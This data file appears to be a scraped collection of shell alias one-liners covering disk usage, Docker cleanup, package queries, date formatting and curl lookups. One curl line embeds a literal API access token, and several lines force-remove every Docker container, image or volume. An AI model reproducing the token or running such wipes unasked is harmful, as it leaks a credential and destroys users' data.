"echo ""Eth(usd): $""$(curl -sL https://api.coinmarketcap.com/v1/ticker/ethereum/ | jq "".[0].price_usd"" | cut -d\"" -f2 )"
"echo ""Conflicts:""; find . -name ""*rej"" | xargs -IXX echo XX | sed -e ""s/.rej//g"" -e ""s/^\.\// - /g"""
"echo ""Btc(usd): $""$(curl -sL https://api.coinmarketcap.com/v1/ticker/bitcoin/ | jq "".[0].price_usd"" | cut -d\"" -f2 )"
"echo ""====what gateway (netstat -rn | g ^0.0.0.0)"";netstat -rn |
"echo ""==== `pwd` ===="" ; for i in `ls -A1` ; do echo -n ""## $i ### "" ; echo ""(`find ./$i -type f | wc -l`)"" ; done | sort -nr"
"echo ""20"" >> ~/.time_saved.txt; git status | grep ""modified:"" | awk "
"echo ""20"" >> ~/.time_saved.txt; git status | grep ""both modified:"" | awk "
"echo ""/usr/bin/play ~/.config/nvim/envsupport/sound/Hail\ to\ the\ king\ baby.mp3"" | at now + 5 minutes; echo ""/usr/bin/play ~/.config/nvim/envsupport/sound/Get\ that\ crap\ outta\ here.mp3"" | at now + 6 minutes"
"echo ""/usr/bin/play ~/.config/nvim/envsupport/sound/Come\ get\ some.mp3"" | at now + 4 minutes; echo ""/usr/bin/play ~/.config/nvim/envsupport/sound/Who\ wants\ some.mp3"" | at now + 5 minutes"
"echo ""------------| List of aliases |------------"";alias"
"echo ""%CPU %MEM PID COMMAND"" && ps hgaxo %cpu,%mem,pid,comm | sort -nrk2 | head -n 10"
"echo ""%CPU %MEM PID COMMAND"" && ps hgaxo %cpu,%mem,pid,comm | sort -nrk1 | head -n 10"
"echo ""${greenf}main base station MAC address${reset}"" && ifconfig en1 | grep ether | cut -c 7-"
"echo ""${PATH}"" | tr "":"" ""\n"" | sort"
"echo ""${ANDROID_HOME}/build-tools/$(ls -1 ${ANDROID_HOME}/build-tools | sort -rn | head -1)"""
"echo ""$TIME - $(date +%s)""|bc -l|displaytime"
"echo ""$PATH"" | tr "":"" ""\n"" | sort"
"echo ""$LAST_QUOTE"" | pbcopy | echo ""=> Last quote copied to pasteboard."""
"echo ""$(trs -l | head -1)\n$(trs -l | grep -v --color=never ""Done"")"""
"echo ""$(nvidia-settings -q gpucoretemp | grep Attribute | sed ""s/ //g"")"""
"echo ""$(g_branchhistory | tail -n 1)"" | xargs git checkout"
"echo ""$(</dev/urandom tr -dc _A-Z-a-z-0-9 | head -c12 | xargs echo)"""
"echo ""$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c20 | xargs echo)"""
"echo ""$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c12 | xargs echo)"""
"echo ""$((free -h)|grep Mem|awk "
"echo ""## netstat -nr:"" && netstat -nr && echo ""## ifconfig:"" && ifconfig | pcregrep -M ""(eth0|wlan0)\s+Link.*\n\s+inet"""
"echo """" | vpipe |jil"
"echo "" done."">&6 || (echo "" faild:"">&6; err_info)"
"echo "" UID PID PPID CPU PRI NI VSZ RSS WCHAN STAT TT TIME COMMAND"";ps axwl|grep -v ""grep""|grep"
"echo "" $(date +%a"" ""%d"" ""%b"" @ ""%T) :: $(history|tail -n1|sed -e "
"echo "" ""$(qstat | grep -c ""avertesy r"") jobs are RUNNING"" "" $(qstat | grep -c ""avertesy qw"") are WAITING"
"ec2dev=$(aws ec2 describe-instances --instance-ids i-a869512b | grep PublicIpAddress | grep -oE ""([0-9]{1,3}\.){3}[0-9]{1,3}"")"
"dulist=$(du -sh */); for i in T G M K; do printf ""$dulist""|egrep ""^[0-9\.]+$i"" | sort -rn; done"
"du1 | grep ""[0-9]G"" | sort -n"
"du / 2>/dev/null | egrep ""[0-9]([0-9]{2}M|G)"""
"du -xh --max-depth=1 | grep -v ""^0 "" | sortk"
"du -x 2>/dev/null | grep -v "".*/.*/.*"" | sort -n"
"du -x -h --max-depth 1 . | grep -E '^([0-9]*M|[0-9,]*G)' "
"du -sm {*,.*} 2>/dev/null | sort -n|tail"
"du -sk .[!.]* err.txt generated.file succ.txt | sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -sk err.txt generated.file succ.txt | sort -nr | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -sk err.txt generated.file succ.txt | sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [[ $size -lt 1024 ]] ; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -sk err.txt generated.file succ.txt | sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -sk err.txt generated.file succ.txt .??* | sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -shc err.txt generated.file succ.txt | grep -v ""^0"" | grep ""[0-9][MG]"""
"du -sh `ls -A | grep . | cut -d """
"du -sh *|grep ""^[.0-9]\+[MG]""|sort -rn"
"du -sh err.txt generated.file succ.txt | grep -v ""/$"" | sort -rh"
"du -sh err.txt generated.file succ.txt 2>/dev/null | egrep ""M|G"""
"du -s err.txt generated.file succ.txt | sort -k1,1rn | head"
"du -m err.txt generated.file succ.txt | egrep $'[0-9]{3,}\t' | sort -n"
"du -kxh | egrep -v ""\./.+/"" | sort "
"du -kd 1 | sort -nr | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -hd9 . | egrep ""(G|M)"""
"du -hd7 . | egrep ""(G|M)"""
"du -hd5 . | egrep ""(G|M)"""
"du -hd3 . | egrep ""(G|M)"""
"du -hd1 . | egrep ""(G|M)"""
"du -h | grep M$""\t"" | sort -k 1 -n -r"
"du -h | grep -e ""\.$"" | cut -f1"
"du -h ./ | grep -v ""^-1"" | grep ""^[0-9]\\+G"""
"du -h -d 1 . | sed ""s/\.\///g"" | sort -h -r"
"du -h $(du err.txt generated.file succ.txt | sort -nr | awk ""{print \$2}"")"
"du -d1 -m | sort -nr | sed -n 2,6p"
"du -csk -- err.txt generated.file succ.txt .[^.]* | sort -n | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -cks err.txt generated.file succ.txt | sort -rn | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"du -cks err.txt generated.file succ.txt 2>/dev/null | sort -rn | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done;"
"du -cha --max-depth=1 / | grep -E ""M|G"""
"du -ch | grep insgesamt |\
"du -ah . | grep -v \""/$\"" | sort -h"
"du -abx | sort -n | gawk '{if(match(\$0, /^([[:digit:]]+)[\\t ]+(.+)/, a)){ s = int(a[1]); n = a[2]; u = \"
"du -Sh ./ | grep -v ""^-1"" | grep ""^[0-9]\\+M"""
"du -Sh --exclude="".git"" --exclude="".svn"" | sort -rh | head -n 10"
"du --max-depth=1 | sort -n | sed ""s/^.*\t//"""
"du err.txt generated.file succ.txt | egrep ""[0-9]M|[0-9]G"" "
"dt=`date -v-1d +%x`; cat ~/.today | grep -e ""$dt"" | cut -c28-"
"dropbox filestatus $(find ~/Dropbox -type f)|grep ""syncing""|uniq"
"dri debian bash -c ""< /dev/urandom tr -dc @_A-Z-a-z-0-9 | head -c${1:-32};"" | cbcopy"
"dracut -f --kver=""$(ls -1 /usr/lib/modules | sort -V | tail -n1)"""
"dpkg -l | tr -s "" "" | grep"
"dpkg -l | grep -Ei ""linux-headers|linux-image"""
"dpkg -l | grep ""xserver\|wayland"""
"dpkg -l | grep ""ii "" | grep -i"
"dpkg --purge $(COLUMNS=200 dpkg -l | grep ""^rc"" | tr -s "
"dpkg --get-selections | grep linux-image-[0-9] | awk '\''{print ""sudo apt-get remove --purge "" $1}'\'''"
"dpkg --get-selections | grep -v deinstall | awk -F"" "" "
"dpkg --get-selections | grep -v deinstall | awk ""{ print \$1 }"""
"dpkg --get-selections | grep -v ""deinstall"" | sed -e ""s/[[:space:]]*install$//"""
"dockerrmimages $(lsdockerimages | grep ""^<none>"" | awk ""{print $3}"")"
"docker-machine stop $(docker-machine ls | tail -1 | awk ""{print $1}"")"
"docker-machine start $(docker-machine ls | tail -1 | awk ""{print $1}"")"
"docker-machine rm $(docker-machine ls | tail -1 | awk ""{print $1}"")"
"docker-machine inspect $(docker-machine ls | tail -1 | awk ""{print $1}"")"
"docker-compose up -d && CONTAINERID=$(docker ps --no-trunc | grep ""rails s"" | cut -f1 -d "" "") && docker attach $CONTAINERID"
"docker-compose logs jupyter | grep -oe ""[a-z0-9]\{48\}"" | tail -n1"
"docker-compose logs -f $(docker ps --format ""{{.Names}}"" | grep -v ""logs"" | tr ""\n"" "" "")"
"docker volume rm $(docker volume ls -qf dangling=true); docker rmi $(docker images | grep ""none"" | awk ""/ / { print $3 }"")"
"docker volume rm $(docker volume ls -qf dangling=true); docker rmi $(docker images | grep ""^<none>"" | awk ""{print $3}""); docker rm $(docker ps -qa --no-trunc --filter ""status=exited"")"
"docker volume ls -q | egrep ""[0-9a-f]{64}"" | xargs docker volume rm"
"docker stop $(docker ps -q | tr ""\n"" "" "") && docker rm $(docker ps -q -a | tr ""\n"" "" "")"
"docker stop $(docker ps -aq) >/dev/null 2>&1 || echo ""No running containers."""
"docker stats --no-stream $(docker ps --format ""{{.Names}}"") | sed ""s/\.[0-9]*\([kGM]i*B \)/\1/"" | sort -h -k 4"
"docker stats $(docker-compose ps -q || echo ""#"")"
"docker stats $(docker ps|grep -v ""NAMES""|awk "
"docker rmi `docker images | grep ""^<none>"" | awk ""{print \\$3}""`"
"docker rmi `docker images | grep ""<none>"" | awk ""{print \$3}""`"
"docker rmi `docker images | grep ""<none>"" | awk ""{print $3}""`"
"docker rmi `docker images | grep ""<none>"" | awk ""{print $3}""` 2>/dev/null"
"docker rmi -f $(docker images | grep none | awk ""{ print $3 }"")"
"docker rmi -f $(docker images | grep \""<none>\"" | awk ""{print \$3}"
"docker rmi -f $(docker images | grep ""^<none>"" | awk ""{print $3}"")"
"docker rmi -f $(docker images | grep ""<none>"" | awk ""{print \$3}"")"
"docker rmi -f $(docker images -a| grep ""<none>"" | awk ""{print \$3}"")"
"docker rmi -f $(docker images --no-trunc | grep ""^<none>"" | awk ""{print \$3}"")"
"docker rmi --force $(docker images | grep ""<none>"" | awk ""{print $3}"") 2> /dev/null"
"docker rmi --force $(docker images | grep ""$GITHUB_ACCOUNT"" | awk ""{print $3}"") 2> /dev/null"
"docker rmi --force $(docker images -q) >/dev/null 2>&1 || echo ""No images to remove."""
"docker rmi $(docker images | peco | awk ""{print \$3}"")"
"docker rmi $(docker images | grep none | awk ""{print $3}"")"
"docker rmi $(docker images | grep \<none\> | awk ""{print \$3}"")"
"docker rmi $(docker images | grep ""^<none>"" | cut -d"" "" -f33)"
"docker rmi $(docker images | grep ""^<none>"" | awk ""{print \$3}"")"
"docker rmi $(docker images | grep ""^<none>"" | awk ""{print $3}"")"
"docker rmi $(docker images | grep ""^<none>"" | awk ""{ print $3}"")"
"docker rmi $(docker images | grep ""^<none>"" | awk "
"docker rmi $(docker images | grep ""<none>"" | awk "
"docker rmi $(docker images -a | grep none | awk ""{print $3}"")"
"docker rmi $(docker images -a | grep -v openjdk | awk ""{if (NR>1) print $3}"")"
"docker rmi $(docker images -a | grep ""^<none>"" | awk ""{print \$3}"")"
"docker rmi $(docker images -a | grep ""^<none>"" | awk ""{print $3}""); clear"
"docker rmi $(docker images -a | grep ""^<none>"" | awk ""{print $3}"")"
"docker rmi $(docker images -a | grep ""^<none>"" | awk "
"docker rmi $(docker images --no-trunc | grep ""^<none>"" | awk ""{print \$3}"")"
"docker rmi $(docker images --filter=""dangling=true""|tail -n+2 |awk ""{print \$3}"")"
"docker rmi $(docker images --all | grep ""^<none>"" | awk ""{print $3}"")"
"docker rm vscode || true ; \
"docker rm `docker ps -aq` && docker rmi $(docker images | grep ""^<none>"" | awk ""{print $3}"")"
"docker rm -f $(docker ps | peco | awk ""{print \$1}"")"
"docker rm -f $(docker ps | grep ""<none>"" | awk ""{print \$3}"")"
"docker rm -f $(docker ps -aq); docker rmi $(docker images | grep ""<none>"" | awk ""{print \$3}"")"
"docker rm -f $(comm -13 <(docker ps -a -q --filter=""name=data"" | sort) <(docker ps -a -q | sort))"
"docker rm --force --volumes $(docker ps -a -q); docker rmi $(docker images | grep ""<none>"" | awk ""{print $3}"")"
"docker rm $(docker ps -aq) >/dev/null 2>&1 || echo ""No containers to remove."""
"docker rm $(docker ps -a | peco | cut -d"" "" -f1)"
"docker rm $(docker ps -a | grep luigipipelines_worker | awk ""{print $1}"")"
"docker rm $(docker ps -a | grep app | awk ""{print $1}"")"
"docker rm $(docker ps -a | grep Exited | awk ""{print $1;}"")"
"docker rm $(docker ps -a -q); docker rmi $(docker images | grep ""^<none>"" | awk ""{print $3}"")"
"docker rm $(docker ps -a --filter=""status=exited""| tail -n+2| awk ""{print \$1}"")"
"docker ps|grep ""thomasbryan/os""|awk "
"docker ps | q -bH1 'select c1, c2, c3 from -' | column -t"
"docker ps | peco | awk ""{print \$1}"""
"docker ps -q | xargs docker inspect --format=""{{printf \""%.20s\"" .Name}} @ {{printf \""%.40s\"" .Config.Image}} @ http://{{if ne \""\"" .NetworkSettings.IPAddress}}{{ printf \""%.22s\"" .NetworkSettings.IPAddress}}{{else}}{{range .NetworkSettings.Networks}}{{printf \""%.22s\"" .IPAddress}}{{end}}{{end}} @ {{printf \""%.10s\"" .State.Status}}"" | column -t -s@ -c 80"
"docker ps -q | xargs -n 1 docker inspect --format ""{{ .NetworkSettings.IPAddress }} {{ .Name }}"" | sed ""s/ \// /"""
"docker ps -q | sed -n ""2p"" | xargs docker logs"
"docker ps -aq | xargs docker rm -f && docker images --filter=""dangling=true"" -q | xargs docker rmi"
"docker ps -a --format ""table {{.Names}}"" | grep -v ""NAMES"" | xargs docker stats"
"docker ps --no-trunc --all | grep Exited | awk ""{print \$1}"""
"docker ps --format ""{{printf \""%-15.15s\"" .Image}} {{printf \""%30.30s\"" .Names}}: {{printf \""%20.20s\"" .Command}} || {{.Status}}"""
"docker kill $(docker ps | tail -n+2 | cut -d"" "" -f1)"
"docker images|grep ""<none>""|xargs docker rmi -f"
"docker images | sort -s -n -k 7,7 | less -S"
"docker images | sort -s -n -k 5,5 | less -S"
"docker images | rg ""<none>"" | awk "
"docker images | peco | awk ""{print \$3}"""
"docker images | grep -v ""IMAGE ID"" | awk "
"docker images | grep -F ""<none>"" | awk "
"docker images | grep ""^<none>"" | tr -s "
"docker images | grep ""^<none>"" | awk ""{print $3}"""
"docker images | grep ""<none>""| awk "
"docker images | grep ""<none>"" | awk "
"docker images | fzf | read name tag rest ; sudo TTS_IMAGES=$name:$tag TESTMODE_BACKUP_DESIGNATOR_FAILURE=""yes"" ./tts-run start-server -f"
"docker images | awk ""{print $3}"" | xargs docker rmi"
"docker images | awk ""$1 ~ /リポジトリ名/ { print $2 }"" | xargs docker rmi"
"docker images -q -f dangling=true | tr '\n' ' ' | xargs docker rmi -f && \
"docker images --no-trunc | grep '<none>' | awk '{ print $3 }' \
"docker images --no-trunc | grep ""<none>"" | awk "
"docker images --no-trunc --all | grep $1 | awk ""{print \$3}"""
"docker images --format ""{{.Repository}}\n\t{{.ID}}: {{.Tag}} | {{.CreatedSince}} | {{.Size}}"""
"docker images --format ""{{ .Repository }}"" | grep -v ""^<none>$"" | xargs -L1 docker pull"
"docker image rm $(dils | peco --prompt ""[rm]"" | awk "
"docker image ls | awk ""/^<none>/ { print \$3 }"" | xargs docker image rm"
"docker image list --format ""{{.Repository}}:{{.Tag}}"" | grep -v "":<none>$"" | xargs --max-args=1 --max-procs=5 docker pull --quiet"
"docker exec -u app -it `docker ps | grep heiaheia_web | sed ""s/ .*//""` /bin/bash"
"docker exec -ti $(docker ps --format ""{{.Names}}"" | sort -r | FZF) bash"
"docker exec -it `docker ps | peco | cut -d"" "" -f 1` /bin/bash"
"docker exec -it `docker ps | grep heiaheia_web | sed ""s/ .*//""` /bin/bash"
"docker exec -it -e COLUMNS=250 -e LINES=50 -e TERM=xterm $(docker ps | peco | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker ps | sed -n 2p | cut -d"" "" -f 1) /bin/sh"
"docker exec -it $(docker ps | peco | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker ps | peco | cut -d "" "" -f 1) /bin/bash"
"docker exec -it $(docker ps | grep main | cut -d"" "" -f1) sh"
"docker exec -it $(docker ps | fzf | cut -d "" "" -f 1) /bin/sh"
"docker exec -it $(docker ps | fzf | cut -d "" "" -f 1) /bin/bash"
"docker exec -i -t $(docker ps | grep squid | awk ""{print \$1}"") bash"
"docker container stop $(docker container ls --quiet 2>/dev/null || sudo docker container ls --quiet); \
"docker container stop $(dcls | peco --prompt ""[stop]"" | cut -d"
"docker container ls -a --format ""{{.ID}}@{{.Image}}@{{.Command}}@{{.Status}}"" | head | column -t -s ""@"""
"docker container ls --format ""{{.ID}}@{{.Image}}@{{.Command}}@{{.Status}}"" | head | column -t -s ""@"""
"docker container logs -f $(dcls | peco --prompt ""[logs]"" | cut -d"
"docker container logs $(dcla | peco --prompt ""[logs]"" | cut -d"
"docker container exec -it $(dcls | peco --prompt ""[exec /bin/bash]"" | cut -d"
"docker container exec -it $(dcls | peco --prompt ""[exec /bin/ash]"" | cut -d"
"docker build --rm -t $(pwd | awk -F/ ""{print \$(NF-1),\$NF}"" | sed ""s/ /\//g"") ."
"docker attach $(docker ps | grep -e ""->3000"" | cut -f 1 -d "" "")"
"docker attach $(docker inspect --format=""{{.Id}}"" $(din|peco|awk ""{print \$1}""))"
"do rmi -f $(do images | grep none | awk ""{print $3}"")"
"dnf list available | tr ""\n"" ""#"" | sed -e "
"dmenu_run -nb ""#$(xrdb -q | grep background | cut -d# -f2)"" -nf ""$(getcolor 0)"" -sb ""#04fe31"""
"dmenu_path | dmenu-custom ""$@"" | ${SHELL:-""/bin/sh""}"
"disown -a -r -h; ps -e -o ""user pid ppid s pcpu nice vsz stime tty time args"" | grep vvv | more"
"diskutil eject `diskutil list | grep external | grep -oE ""/dev/disk[0-9]""`"
"dirs -v | head -n 10 | sort && read dir_index && [ -n ""$dir_index"" ] && cd -$dir_index; true"
"dir_list_num| sed -e ""s#$HOME#~#g"" | tail -n+1"
"dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null || echo ""No internet connection"""
"diff --suppress-common-lines -y <(cd ~/Music; gls --ignore='*OGG'|sort) ,(cd /Volumes/Untitled/christian/Music/; gls --ignore='*FLAC'|sort)"
"dfc -TWfc always | egrep -v ""/opt/alien/data| /data"""
"df -lh | awk ""{print \$1,\$5,\$4}"" | column -t"
"df -lPH | grep -v ""^tmpfs"" | sort -hk3"
"df -h| grep -vE "" /snap|^tmpfs"""
"df -hlP | egrep ""^(/dev|Filesystem)"""
"df -hT | grep -vE ""(tmpfs|Use%)"""
"df -hT | egrep ""Type|tmpfs"""
"df -hT | egrep ""%|/"""
"df -hT -x tmpfs -x devtmpfs | sort -k 1 | sed -e \$d -e ""1s/^/Filesystem Type Size Used Avail Use% Mounted on\n/"""
"df -hP | sed -e ""s/Sist. Arq./Sist.Arq./"" | column -t"
"df -h | grep sd |\
"df -h | grep home | cut -d"" "" -f 8"
"df -h | grep -v ^none | ( read header ; echo ""$header"" ; sort -n -k 5)"
"df -h | grep -P ""F|[A-Z]:"""
"df -h | grep -E --color=never ""(Filesystem)|(/dev/sd)"""
"df -h | grep --color=no -e ""^Filesystem\|^/dev/"""
"df -h | grep --color=never -E "".*(mapper).*|Filesystem"""
"df -h | grep --color=never ""^\(Filesystem\|/dev/\)"""
"df -h | grep ""^/dev"" | sort"
"df -h | egrep -v ""^map -hosts|^devfs"""
"df -h | egrep -v ""(snap|run)"""
"df -h | egrep ""${USER}|Filesystem"""
"df -h / | tail -n 1 | cut -d"" "" -f7"
"df -h -T | grep -v -E ""^tmpfs|devtmpfs"""
"df -H -T | grep -v -E ""tmpfs|overlay"""
"df --human-readable --print-type --exclude-type=tmpfs --exclude-type=devtmpfs --exclude-type=squashfs | hl $RED ""\(100\|9.\)%"""
"del ~/.vim >/dev/null 2&>1 ; cp -rf ~/.bak/.vim ~/ ; (vimrc-down && success ""vim downgrade"") || fail ""vim downgrade"""
"defaults find UUID | grep -E ""MessageCompatibility|MailCompatibility"""
"defaults domains | tr ',' '\n' | sed 's/^ //'"
"declare -F | grep -v _ | awk ""{print \$3}"""
"deactivate 2>/dev/null; [ -d .venv ] || python3 -m venv --prompt ""$(basename ""$PWD"")"" .venv && source .venv/bin/activate && pip install -q -U pip"
"de $(docker inspect --format=""{{.Id}}"" $(din|peco|awk ""{print \$1}""))"
"dd if=GMBackup.ab bs=1 skip=24 | python -c ""import zlib, sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))"" | tar -xvf -"
"dd if=/dev/urandom count=1 2>/dev/null | md5sum | cut -d"" "" -f 1"
"dd if=/dev/urandom bs=8 count=1 2>/dev/null | od -x -A n | sed -e ""s/^ //"" -e ""s/ /:/g"" -e ""s/:0*/:/g"" -e ""s/^0*//"""
"dd if=/dev/urandom bs=32 count=1 status=none|sha256sum|cut -d"" "" -f1"
"dd if=/dev/urandom bs=1 count=32 2>/dev/null | base64 | sed -e ""s/=*$//"""
"dd if=/dev/random bs=1024 count=1 2>/dev/null| strings | LC_CTYPE=C tr -d ""\n"""
"dd if=$HOME/scf_bkup.ab bs=1 skip=24 | python -c 'import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))' | tar -xvf -"
"dcr --entrypoint ""bash -c \""which pipenv && pipenv lock || pip-compile\"""" django && dcb"
"dbus-monitor ""interface=org.freedesktop.Notifications"" | grep --line-buffered ""member=Notify\|string"""
"date | cut -f 2,3,4 -d' ' | sed 's, ,_,g; s,:,.,g'"
"date | cut -d ',' -f 1 | espeak -v fr"
"date --date=@$((16#`printf ""\xb%-47.s""|nc -uq1 ntp.ludd.ltu.se 123|xxd -s40 -l4 -p`-2208988800))"
"date +""%Y-%m-%d %H:%M:%S"" | tr -d ""\n"" | pbcopy"
"date +""%Y-%m-%d %H:%M:%S"" | perl -ne ""chomp and print"" | pbcopy"
"date +"" [=] %A %d %B %Y (o) %H : %M : %S | %:z | """
"date ""+%Y/%m/%d %H:%M:%S"" | tee >(tr -d ""\n"" | pbcopy)"
"date ""+%Y/%m/%d %H:%M"" | tee | pbcopy"
"date ""+%Y-%m-%d"" | xargs echo -n | tee >(xclip) >(xclip -sel c) > /dev/null"
"date ""+%Y-%m-%d"" | tr -d ""\\n"" | xclip -selection clipboard -in"
"date ""+%H:%M""| tr -d ""\n"" | pbcopy"
"d yesterday | cut -d "" "" -f 2- | sed -e ""s/^/ /"""
"d rmi $(d images | rg -i ""none"" | awk ""{print $3}"")"
"d $(git rev-parse --show-toplevel || echo ""."")"
"cvs status | grep Status | grep -v ""Up-to-date"""
"cvs status | grep -e ""File:"" -e ""?"" | grep -v -e ""Up-to-date"""
"cvs status \!* |& grep Status: |& grep -v ""to-date"""
"cvs status \!* | grep ""File:"" | grep -v ""Up-to-date"""
"cvs status \!* | grep ""File:"" | grep -v ""Up-to-date"" > cvs-stat-temp"
"cvs status 2>/dev/null | grep Status: | grep -v ""to-date"""
"cvs status 2>&1 | grep ""Status:"" | grep Local"
"cvs status 2> /dev/null | grep ""File:"" | grep -v ""Up-to-date"""
"cvs editors | cut -f1-3 | expand -65,85"
"cvs editors . | grep $USER | sed ""s/[ ].*//"""
"cvs -q status | grep ^[?F] | grep -v ""to-date"""
"cvs -n up 2>&1 | egrep ""^M.*"" | cut -d "" "" -f2-"
"cut -d',' -f2 | cut -d' ' -f3 | head -n 1"
"cut -d' ' -f2 < data | python3 -c 'import sys; print(sum(map(lambda x: int(str.rstrip(x)), sys.stdin)) / \`wc -l data | cut -d' ' -f1\`)'"
"cut -d"":"" -f1 /etc/passwd | sort | column"
"cut -d"":"" -f1 /etc/group | sort | column"
"cut -d \ -f5- ${HOME}/.history/????????.log | perl -e ""print reverse <>"" | less"
"cut -d \ -f5- ${HOME}/.history/????????.log | perl -e ""print reverse <>"" | less -p"
"cut -d \ -f5- ${HOME}/.history/????????.log | perl -e ""print reverse <>"" | grep -m10"
"cut -d \ -f3- ${HOME}/.history/????????.log | perl -e ""print reverse <>"" | less"
"cut -d "":"" -f 1,2 | tr ""\n"" "" "" | head -c -1 ; echo"
"current_branch=$(git branch | grep \* | cut -d "" "" -f2) ; git checkout master ; git fetch ; git pull origin master ; git checkout $current_branch ; git rebase master"
"current_branch=$(git branch | grep \* | cut -d "" "" -f2) ; git checkout -b $current_branch-bak"
"curl https://xkcd.com/info.0.json 2> /dev/null| \jq "".img"" | xargs feh"
"curl https://www.privateinternetaccess.com --silent | grep -Eo ""<strong style=\""font-weight:bold;\"">(.*)</strong>"" | sed ""s/<[^>]*>//g"""
"curl https://www.archlinux.org/mirrorlist/?country=AU\&country=BE\&country=CZ\&country=DK\&country=FI\&country=FR\&country=DE\&country=IE\&country=IT\&country=LU\&country=NL\&country=NO\&country=ES\&country=SE\&country=CH\&country=GB\&protocol=https\&ip_version=4\&ip_version=6 |sudo tee /etc/pacman.d/mirrorlist.tmp >/dev/null && sudo sed -i ""s/^#Server/Server/"" /etc/pacman.d/mirrorlist.tmp && sudo rankmirrors -n 12 /etc/pacman.d/mirrorlist.tmp |sudo tee /etc/pacman.d/mirrorlist"
"curl https://api.weather.gov/gridpoints/OKX/33,35/forecast | jq .properties.periods[0].detailedForecast | sed 's/pre//'"
"curl https://api.github.com/users/paladiamors/repos -s | grep \""name\"" | cut -d \"" -f 4"
"curl http://checkip.dyndns.org:8245/ | grep IP | awk '{gsub(/<.*/, \"
"curl -u $user:$pass --silent ""https://mail.google.com/mail/feed/atom"" | grep -oPm2 ""(?<=<title>)[^<]+"" | sed "
"curl -sL -w ""\nstatus code: %{http_code} | time: %{time_total} | type: %{content_type}\n"""
"curl -sH ""Accept-encoding: gzip"" https://app.dev.wordsearchbible.com/ | gunzip - | ack ""(Build: v\d+)"" --output=""\$1"""
"curl -sH ""Accept-Language: zh"" wttr.in/Taipei?2n | head -n 28; w3m -dump -no-cookie http://cwb.gov.tw/V7/observe/24real/Data/46692.htm | head -n 10"
"curl -s whatthecommit.com | grep ""<p>"" | sed s/\<p\>//g"
"curl -s towel.blinkenlights.nl:666|tr -d ""[:cntrl:]""|sed ""s/^.*=//;s/$/\n/"""
"curl -s ipinfo.io | cat ip | jq -r '.ip, .region, .country, .org'"
"curl -s ifconfig.co | tr -d ""\n"" | pbcopy; echo -n ""IP Address is: ""; pbpaste; echo"
"curl -s https://api.github.com/users/nesterchung/repos | jq -c '.[] | {name,html_url}'"
"curl -s https://api.github.com/users/mpapierski/keys | jq -C -r ""sort_by(.id) | .[].key"""
"curl -s http://feeds.bbci.co.uk/news/rss.xml?edition=int | grep -o --color=never ""\[CDATA\[.*\]\]"" | sed s/CDATA/\/g"
"curl -s checkip.dyndns.org | sed -e ""s/.*Current IP Address: //"" | cut -d""<"" -f1"
"curl -s checkip.dyndns.org | cut -f 6 -d "" "" | cut -f 1 -d ""<"""
"curl -s -O http://s3.amazonaws.com/alexa-static/top-1m.csv.zip ; unzip -q -o top-1m.csv.zip top-1m.csv ; head -1000 top-1m.csv | cut -d, -f2 | cut -d/ -f1 > topsites.txt"
"curl -s -G https://hotspot.um.ac.ir/logout > /dev/null && printf ""\e[31;1m%s\n\e[0m"" ""FUM Hotspot Logged Out"" || printf ""\e[31;1m%s\n\e[0m"" ""Could not resolve host: hotspot.um.ac.ir"""
"curl -s -F ""sprunge=<-"" sprunge.us | xclip -i && xclip -o | tr -d "
"curl -s -F ""f:1=<-"" ix.io | xclip -i && xclip -o | tr -d "
"curl -s --head http://google.com | grep ^Date: | sed ""s/Date: //g"""
"curl -s 'https://duckduckgo.com/?q=what+is+my+ip&ia=answer&format=json' | jq -r .Answer | grep --color=never -Po '(?:\d{1,3}\.){3}\d{1,3}'"
"curl -s ""https://www.archlinux.org/mirrorlist/?country=US&protocol=https&use_mirror_status=on"" | sed -e ""s/^#Server/Server/"" -e ""/^#/d"" | rankmirrors -n 5 -"
"curl -s ""https://pilotweb.nas.faa.gov/PilotWeb/notamRetrievalByICAOAction.do?method=displayByICAOs&formatType=DOMESTIC&retrieveLocId=karb&reportType=RAW&actionType=notamRetrievalByICAOs"" | tr -d ""\n"" | pcregrep -M -o1 -N CRLF -i ""<pre>([^<]*)"""
"curl -s ""https://cdn.contentful.com/spaces/6qqte9wlq16o/entries?access_token=bab0ec81f61331d6e29f5c0e3164d8d506c5ae6957088607c0125a71124177c7"" | jq .items[0].fields.$(date +%A | tr "
"curl -s ""http://www.geoiptool.com/en/?IP=${IP}"" | textutil -stdin -format html -stdout -convert txt | sed -n ""/Host Name/,/Postal code/p"""
"curl -s ""http://www.aviationweather.gov/adds/metars/index.php?station_ids=karb,kozw,kyip,kdtw,ktol,kttf,klan,koeb,kjxn,kgrr,kphn,kazo&std_trans=standard&chk_metars=on&hoursStr=most+recent+only&submitmet=Submit"" | html2text -width 255 | sed ""1,4d"""
"curl -s ""http://whatthecommit.com"" | grep ""<p>"" | cut -c4-"
